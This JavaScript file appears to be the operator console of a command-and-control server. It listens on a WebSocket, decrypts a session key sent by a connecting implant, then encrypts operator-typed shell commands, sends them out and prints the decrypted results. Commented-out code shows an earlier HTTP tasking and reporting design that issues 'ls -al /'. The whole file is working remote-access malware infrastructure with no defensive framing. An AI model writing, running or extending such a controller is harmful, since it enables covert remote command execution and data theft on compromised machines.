import crypto from "crypto";
import { symmetricEncrypt, symmetricDecrypt, privkeyDecrypt } from "./crypto";

import { WebSocketServer } from "ws";

const port = SERVER_PORT;
const private_key = PRIVATE_KEY;
const wss = new WebSocketServer({ port });

var readline = require('readline');
var rl = readline.createInterface(process.stdin, process.stdout);

let connected = false;

wss.on("connection", function connection(ws) {
  if (connected){
    ws.close()
    return;
  }
  let symkey = null;

  ws.on("error", console.error);

  ws.on("message", function message(data) {
    // Check if symkey is configured. If not, load first message as encrypted symkey.
    if (symkey == null) {
      console.log("Connection established. Decoding symmetric key");
      symkey = privkeyDecrypt(data, private_key);
      console.log("Decoded", symkey);
      console.log("You may now enter commands")
      connected = true
      return;
    }

    // Otherwise, decode and display result
    const decryptedData = symmetricDecrypt(data, symkey);
    console.log(decryptedData.toString('utf8'))
  });

  ws.on('close', ()=>{connected = false});

  rl.on('line', (command)=>{
    const encryptedCommand = symmetricEncrypt(command, symkey)
    ws.send(encryptedCommand)
  })

  rl.on('close', ()=>ws.close())
});



// app.post("/task", (req, res) => {
//   console.log("Received encrypted task request: ", req.body);
//   const taskRequest = privkeyDecrypt(req.body, private_key);

//   console.log(taskRequest);

//   const response = {
//     task_id: taskRequest.task_id,
//     command: "ls -al /",
//   };

//   taskRequestToSymKey[taskRequest.task_id] = taskRequest.symkey;

//   res.status(200).json(symmetricEncrypt(response, taskRequest.symkey));
// });

// // Endpoint to handle JSON data at /poll
// app.post("/report", (req, res) => {
//   const { data, iv, task_id } = req.body;

//   const symkey = taskRequestToSymKey[task_id];

//   const report = symmetricDecrypt({ iv, data }, symkey);

//   console.log("Received task report:", report);

//   res.status(200).end();
// });

// // Start the server
// app.listen(port, () => {
//   console.log(`Server is running on http://localhost:${port}`);
// });
